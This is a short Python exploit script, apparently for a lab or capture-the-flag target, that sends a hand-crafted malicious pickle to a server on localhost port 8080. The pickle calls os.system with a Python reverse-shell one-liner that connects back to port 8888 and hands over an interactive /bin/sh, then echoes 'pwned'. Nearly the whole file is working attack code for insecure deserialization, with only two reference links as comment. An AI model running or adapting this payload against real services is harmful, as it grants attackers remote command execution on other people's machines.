#!/usr/bin/python3
import sys
import socket

from common import recv_msg

# Smashing the pickling for fun and profit
#   - https://sensepost.com/cms/resources/conferences/2011/sour_pickles/BH_US_11_Slaviero_Sour_Pickles.pdf
#   - https://checkoway.net/musings/pickle/

MSG_TERM = b"\r\n\r\n"

pack_little = lambda x: x.to_bytes(4, byteorder="little")

def sv_conn():
    sv_host = "127.0.0.1"
    sv_port = 8080

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sv_host, sv_port))
    return s

def reverse_shell_pickle():
    # nc -l [PORT]  @ HOST machine
    HOST = b"127.0.0.1"
    PORT = 8888

    python_reverse_shell = b"".join([
        b"python -c",
        b"'import socket,subprocess,os;",
        b"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
        b"s.connect((\"%s\",%i));os.dup2(s.fileno(),0);" % (HOST, PORT) ,
        b"os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);",
        b"p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ])

    post_exploit_cmd = b"echo pwned"
    shellcode = b"".join([
        b"cos\n",
        b"system\n",
        b"(S'%s'\n" % python_reverse_shell,
        b"tR",
        b"(B%s%s" % (pack_little(len(post_exploit_cmd)), post_exploit_cmd),
        b'.'
        ])
    return shellcode

def send(s, payload):
    s.send(payload + MSG_TERM)

if __name__ == "__main__":
    s = sv_conn()
    payload = reverse_shell_pickle()
    send(s, payload)
    print(recv_msg(s))
